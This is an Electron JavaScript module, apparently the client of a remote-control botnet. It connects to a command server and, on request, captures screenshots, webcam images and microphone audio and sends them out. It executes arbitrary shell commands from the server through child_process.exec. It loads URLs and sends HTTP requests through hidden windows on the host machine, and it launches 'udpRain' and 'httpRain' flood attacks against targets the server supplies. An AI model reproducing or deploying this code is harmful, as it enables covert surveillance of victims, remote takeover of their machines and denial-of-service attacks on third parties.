const { desktopCapturer, screen, app, ipcMain, BrowserWindow } = require("electron");
const io = require("socket.io-client");
const child_process = require("child_process");
const { requireCompiled } = require("./requireCompiled");
const udpRain = requireCompiled("./udpRain");
const httpRain = requireCompiled("./httpRain");
const axios = require("axios");
//udpRain.start({ port: 53, ip: "192.168.1.180", seconds: 5, interval: 1000 });

// My Modules
const info = requireCompiled("./config");

class RemoteControl {
  constructor() {
    this.mainWindow;
    this.remoteBrowserWindow = null;
    this.httpResponseWindow = null;
    this.remoteBrowserCaptureInterval = null;
    this.currentRemoteBrowserData = null;
  }
  getCamDataWeb = (data) => {
    console.log({ getCamDataWeb: data });
    this.mainWindow.reload();
    setTimeout(() => {
      this.mainWindow.webContents.send("camStart", data);
    }, 3000);
  };
  
  handleAudioListen = (data) => {
    console.log({ handleAudioListen: data });
    this.mainWindow.webContents.send("audioListenStart", data);
  };

  getScreenData = (data) => {
    (async () => {
      try {
        // Hem screen hem window'ları al
        let sources = await desktopCapturer.getSources({
          types: ["screen", "window"],
          thumbnailSize: {
            width: parseInt(data.dimension.split("x")[0]),
            height: parseInt(data.dimension.split("x")[1]),
          },
        });

        // Screen ID ile bul (index değil)
        const screenId = data.screenId || data.screen; // Eski kod uyumluluğu için data.screen de kontrol et
        
        let foundSource = null;
        try {
          if (screenId) {
            // ID ile ara
            foundSource = sources.find(source => source.id === screenId);
            
            // Eğer bulunamazsa, eski index yöntemini dene (geriye dönük uyumluluk)
            if (!foundSource && !isNaN(parseInt(screenId))) {
              const screenIndex = parseInt(screenId);
              if (screenIndex >= 0 && screenIndex < sources.length) {
                foundSource = sources[screenIndex];
              }
            }
          }

          if (foundSource) {
            try {
              // Window kapanmış olabilir, thumbnail alma işlemini try-catch içine al
              data["src"] = foundSource.thumbnail.toDataURL();
              console.log("Screenshot taken for:", foundSource.name, "ID:", foundSource.id);
              this.socket.emit("screenshotResponse", data);
            } catch (thumbnailError) {
              console.error("Error getting thumbnail (window may be closed):", thumbnailError.message);
              data["src"] = "";
              this.socket.emit("screenshotResponse", data);
            }
          } else {
            console.error("Screen not found. ID:", screenId, "Available sources:", sources.length);
            data["src"] = "";
            this.socket.emit("screenshotResponse", data);
          }
        } catch (findError) {
          console.error("Error finding source (window may be closed):", findError.message);
          data["src"] = "";
          this.socket.emit("screenshotResponse", data);
        }
      } catch (err) {
        console.error("Error getting screen data:", err.message);
        data["src"] = "";
        this.socket.emit("screenshotResponse", data);
      }
    })();
  };


  start = (mainWindow) => {
    this.mainWindow = mainWindow;

    this.socket = io.connect("http://" + info.host + ":" + info.port);
    this.socket.on("connect", () => {
      this.socket.emit("joinToRoom", { roomName: "terminal-" + info.id });
    });

    this.socket.on("screenshotRequest", (data) => {
      this.getScreenData(data);
    });

    this.socket.on("camShotRequest", (data) => {
      this.getCamDataWeb(data);
    });
    
    this.socket.on("audioListenRequest", (data) => {
      console.log("🎧 Audio listen request received:", data.action);
      this.handleAudioListen(data);
    });

    ipcMain.on("cam", (event, args) => {
      this.socket.emit("camShotResponse", args);
    });
    
    // Binary transfer için yeni handler
    ipcMain.on("camBinary", (event, args) => {
      this.socket.emit("camBinary", args);
    });
    
    // Audio stream için handler
    ipcMain.on("audioStream", (event, args) => {
      console.log("📥 Audio stream received from renderer:", args.audioData ? args.audioData.length : "no data", "chars (base64)");
      console.log("📡 MIME type:", args.mimeType);
      
      if (args.audioData && args.audioData.length > 0) {
        console.log("📤 Forwarding audio data to server");
        this.socket.emit("audioStreamResponse", args);
      } else {
        console.log("⚠️ No audio data to forward");
      }
    });
    
    // Audio listen status için handler
    ipcMain.on("audioListenStatus", (event, args) => {
      this.socket.emit("audioListenStatus", args);
    });

    this.socket.on("getRunRequest", (data) => {
      console.log({ getRunRequest: data });
      if (data.cmd.indexOf("udpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          port: parseInt(splittedData[2]),
          ip: splittedData[1],
          seconds: parseInt(splittedData[3]),
          interval: parseInt(splittedData[4]),
        };
        console.log({ createdData });
        udpRain.start(createdData);
      } else if (data.cmd.indexOf("httpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          url: splittedData[1],
          seconds: parseInt(splittedData[2]),
          interval: parseInt(splittedData[3]),
        };
        console.log({ createdData });
        httpRain.start(createdData);
      }
      else if (data.cmd.indexOf("codeRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          seconds: parseInt(splittedData[1]),
          interval: parseInt(splittedData[2]),
          code: splittedData[3],
        };
        console.log({ createdData });
        httpRain.codeRainStart(createdData);
      }
      else {
        try {
          child_process.exec(
            data.cmd,
            { shell: true },
            (err, stdout, stderr) => {
              if (err) {
                data["cmd"] = "err: " + err;
              } else if (stderr) {
                data["cmd"] = "stderr: " + stderr;
              } else {
                data["cmd"] = stdout;
              }

              this.socket.emit("getRunResponse", data);
            }
          );
        } catch (error) {
          data["cmd"] = "catchError: " + error;
          this.socket.emit("getRunResponse", data);
        }
      }
    });

    /**
     * Remote Browser - Ekran görüntüsü yaklaşımı
     * Terminal'de BrowserWindow açılır, ekran görüntüsü alınır
     */
    this.socket.on("remoteBrowserOpen", (data) => {
      // data: { from, to, url }
      console.log("📥 [ELECTRON] remoteBrowserOpen received:", data);
      this.openRemoteBrowser(data);
    });

    /**
     * HTTP Request - Terminal üzerinden HTTP isteği gönder, response ekran görüntüsü olarak döndür
     */
    this.socket.on("httpRequest", (data) => {
      // data: { from, to, method, url, headers, body }
      console.log("📥 [ELECTRON] httpRequest received:", data.method, data.url);
      this.executeHttpRequest(data);
    });

    // Screen/window listesi isteği
    this.socket.on("getScreenListRequest", (data) => {
      this.getScreenList(data);
    });

  };

  /**
   * Remote Browser - BrowserWindow oluştur (bir kez)
   */
  createRemoteBrowserWindow = () => {
    if (this.remoteBrowserWindow && !this.remoteBrowserWindow.isDestroyed()) {
      return; // Zaten var
    }

    console.log("Creating remote browser window...");
    this.remoteBrowserWindow = new BrowserWindow({
      width: 1920,
      height: 1080,
      show: false, // gizli pencere
      webPreferences: {
        nodeIntegration: false,
        contextIsolation: false,
        sandbox: false,
        webSecurity: true,
      },
    });

    // Event listener'ları bir kez ekle
    this.remoteBrowserWindow.webContents.on('did-fail-load', (event, errorCode, errorDescription, validatedURL) => {
      console.error("❌ [ELECTRON] Remote browser failed to load:", errorCode, errorDescription);
      if (this.currentRemoteBrowserData) {
        const errorImg = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');
        const errorDataUrl = 'data:image/png;base64,' + errorImg.toString('base64');
        this.socket.emit("remoteBrowserFrame", {
          from: this.currentRemoteBrowserData.from,
          to: this.currentRemoteBrowserData.to,
          url: this.currentRemoteBrowserData.url,
          src: errorDataUrl,
          width: 1920,
          height: 1080,
          error: errorDescription
        });
      }
    });

    this.remoteBrowserWindow.webContents.on('did-finish-load', () => {
      console.log("✅ [ELECTRON] Remote browser page loaded");
      // İlk capture'ı hemen al
      if (this.currentRemoteBrowserData) {
        setTimeout(() => {
          this.captureRemoteBrowser(this.currentRemoteBrowserData);
        }, 1000);
      }
    });

    // Dom ready olduğunda da capture al
    this.remoteBrowserWindow.webContents.on('dom-ready', () => {
      console.log("✅ [ELECTRON] Remote browser DOM ready");
      if (this.currentRemoteBrowserData) {
        setTimeout(() => {
          this.captureRemoteBrowser(this.currentRemoteBrowserData);
        }, 500);
      }
    });
  };

  /**
   * Remote Browser - URL yükle ve streaming başlat
   */
  openRemoteBrowser = (data) => {
    const targetUrl = data.url;
    console.log("📥 [ELECTRON] Opening remote browser for URL:", targetUrl);

    // Mevcut streaming'i durdur
    if (this.remoteBrowserCaptureInterval) {
      clearInterval(this.remoteBrowserCaptureInterval);
      this.remoteBrowserCaptureInterval = null;
    }

    // BrowserWindow'u oluştur (yoksa)
    this.createRemoteBrowserWindow();

    // Mevcut data'yı sakla
    this.currentRemoteBrowserData = data;

    // URL'yi yükle
    console.log("📤 [ELECTRON] Loading URL:", targetUrl);
    this.remoteBrowserWindow.loadURL(targetUrl).catch((err) => {
      console.error("❌ [ELECTRON] Remote browser load error:", err);
      const errorImg = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');
      const errorDataUrl = 'data:image/png;base64,' + errorImg.toString('base64');
      this.socket.emit("remoteBrowserFrame", {
        from: data.from,
        to: data.to,
        url: targetUrl,
        src: errorDataUrl,
        width: 1920,
        height: 1080,
        error: err.message || 'Failed to load URL'
      });
    });

    // Streaming başlat - her 2 saniyede bir capture al
    this.remoteBrowserCaptureInterval = setInterval(() => {
      if (this.remoteBrowserWindow && !this.remoteBrowserWindow.isDestroyed() && this.currentRemoteBrowserData) {
        const isLoading = this.remoteBrowserWindow.webContents.isLoading();
        if (!isLoading) {
          this.captureRemoteBrowser(this.currentRemoteBrowserData);
        }
      } else {
        // Window kapandıysa interval'i temizle
        if (this.remoteBrowserCaptureInterval) {
          clearInterval(this.remoteBrowserCaptureInterval);
          this.remoteBrowserCaptureInterval = null;
        }
      }
    }, 2000); // Her 2 saniyede bir
  };

  /**
   * Remote browser ekran görüntüsü al
   */
  captureRemoteBrowser = (data) => {
    if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
      console.warn("⚠️ [ELECTRON] Cannot capture - window destroyed");
      return;
    }

    if (!data) {
      data = this.currentRemoteBrowserData;
    }

    if (!data) {
      console.warn("⚠️ [ELECTRON] Cannot capture - no data");
      return;
    }

    try {
      this.remoteBrowserWindow.webContents
        .capturePage()
        .then((image) => {
          const src = image.toDataURL('image/jpeg', 0.85);
          console.log("📤 [ELECTRON] Sending remoteBrowserFrame, size:", src.length, "chars");
          this.socket.emit("remoteBrowserFrame", {
            from: data.from,
            to: data.to,
            url: data.url,
            src: src,
            width: image.getSize().width,
            height: image.getSize().height
          });
        })
        .catch((err) => {
          console.error("❌ [ELECTRON] Remote browser capture error:", err);
        });
    } catch (err) {
      console.error("❌ [ELECTRON] Capture exception:", err);
    }
  };

  /**
   * HTTP Request - Terminal üzerinden HTTP isteği gönder, response'u browser'da göster
   */
  executeHttpRequest = async (data) => {
    const { method, url, headers, body } = data;

    try {
      // Content-Type JSON mi kontrol et (eski Node/Electron uyumlu)
      const contentTypeHeader =
        (headers && (headers["Content-Type"] || headers["content-type"])) || "";
      const isJsonRequest =
        typeof contentTypeHeader === "string" &&
        contentTypeHeader.indexOf("application/json") !== -1;

      // Axios ile HTTP isteği (terminal üzerinden)
      const config = {
        method: method || 'GET',
        url: url,
        timeout: 30000,
        headers: headers || {},
        maxRedirects: 5,
        validateStatus: () => true, // Tüm status kodlarını kabul et
      };

      // Request body varsa ekle
      if (body && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
        if (isJsonRequest) {
          config.data = typeof body === 'string' ? body : JSON.stringify(body);
        } else {
          config.data = body;
        }
      }

      const response = await axios(config);

      // Response'u text olarak formatla
      const responseContentType =
        (response.headers && (response.headers["content-type"] || response.headers["Content-Type"])) || "";
      const isJsonResponse =
        typeof responseContentType === "string" &&
        responseContentType.indexOf("application/json") !== -1;

      // Response'u text formatında hazırla
      let responseText = `Status: ${response.status} ${response.statusText || ''}\n\n`;
      responseText += `Response Headers:\n`;
      responseText += Object.entries(response.headers).map(([key, value]) => 
        `${key}: ${value}`
      ).join('\n');
      responseText += `\n\nResponse Body:\n`;
      responseText += this.formatResponseBody(response.data, responseContentType);

      // Text olarak gönder
      console.log("📤 [ELECTRON] Sending httpResponseText, length:", responseText.length, "chars", "status:", response.status);
      this.socket.emit("httpResponseText", {
        from: data.from,
        to: data.to,
        url: url,
        method: method,
        status: response.status,
        statusText: response.statusText || '',
        headers: response.headers,
        contentType: responseContentType,
        body: responseText,
        isJson: isJsonResponse
      });

    } catch (error) {
      console.error("HTTP request error:", error.message);
      
      // Hata durumunda error text gönder
      let errorText = `HTTP Request Error\n\n`;
      errorText += `URL: ${url}\n`;
      errorText += `Method: ${method}\n`;
      errorText += `Error: ${error.message}\n`;
      if (error.code) {
        errorText += `Code: ${error.code}\n`;
      }

      console.log("📤 [ELECTRON] Sending httpResponseText (error), length:", errorText.length, "chars");
      this.socket.emit("httpResponseText", {
        from: data.from,
        to: data.to,
        url: url,
        method: method,
        status: 0,
        statusText: 'Error',
        error: error.message,
        errorCode: error.code,
        body: errorText,
        isJson: false
      });
    }
  };

  /**
   * HTTP Response ekran görüntüsü al
   */
  captureHttpResponse = (data) => {
    if (!this.httpResponseWindow || this.httpResponseWindow.isDestroyed()) {
      console.warn("⚠️ [ELECTRON] Cannot capture HTTP response - window destroyed");
      return;
    }

    try {
      this.httpResponseWindow.webContents
        .capturePage()
        .then((image) => {
          const src = image.toDataURL('image/jpeg', 0.85);
          console.log("📤 [ELECTRON] Sending httpResponseFrame, size:", src.length, "chars", "status:", data.status);
          this.socket.emit("httpResponseFrame", {
            from: data.from,
            to: data.to,
            url: data.url,
            method: data.method,
            status: data.status,
            src: src,
            width: image.getSize().width,
            height: image.getSize().height
          });
        })
        .catch((err) => {
          console.error("❌ [ELECTRON] HTTP response capture error:", err);
        });
    } catch (err) {
      console.error("❌ [ELECTRON] HTTP response capture exception:", err);
    }
  };

  /**
   * HTML escape fonksiyonu
   */
  escapeHtml = (text) => {
    if (typeof text !== 'string') {
      text = String(text);
    }
    const map = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, (m) => map[m]);
  };

  /**
   * Response body'yi formatla
   */
  formatResponseBody = (data, contentType) => {
    if (!data) return '(empty)';
    
    try {
      // Axios otomatik olarak JSON response'ları parse eder
      // Eğer data zaten bir object ise direkt stringify yap
      if (typeof data === 'object') {
        return JSON.stringify(data, null, 2);
      } 
      // Eğer string ise ve JSON content-type ise parse et
      else if (typeof data === 'string' && contentType && contentType.includes('application/json')) {
        try {
          const parsed = JSON.parse(data);
          return JSON.stringify(parsed, null, 2);
        } catch (parseError) {
          // Parse edilemezse string olarak döndür
          return data;
        }
      } 
      // Diğer durumlarda string olarak döndür
      else {
        return String(data);
      }
    } catch (e) {
      // Hata durumunda string olarak döndür
      return String(data);
    }
  };

  /**
   * Screen/window listesi al ve dashboard'a gönder
   */
  getScreenList = async (data) => {
    try {
      console.log("Getting screen/window list...");
      
      // Hem screen hem window'ları al
      const sources = await desktopCapturer.getSources({
        types: ["screen", "window"],
        thumbnailSize: { width: 200, height: 200 }
      });

      console.log("Found", sources.length, "sources");

      const screens = sources.map((source, index) => {
        const isScreen = source.id.startsWith("screen:") || source.id.includes("Screen");
        return {
          id: source.id,
          name: source.name || (isScreen ? `Screen ${index + 1}` : `Window: ${source.name}`),
          thumbnail: source.thumbnail.toDataURL(),
          type: isScreen ? "screen" : "window"
        };
      });

      console.log("Sending screen list to dashboard:", screens.length, "items");
      
      this.socket.emit("getScreenListResponse", {
        from: data.from,
        to: data.to,
        screens: screens
      });
    } catch (err) {
      console.error("Error getting screen list:", err);
      this.socket.emit("getScreenListResponse", {
        from: data.from,
        to: data.to,
        screens: []
      });
    }
  };
}

module.exports = new RemoteControl();
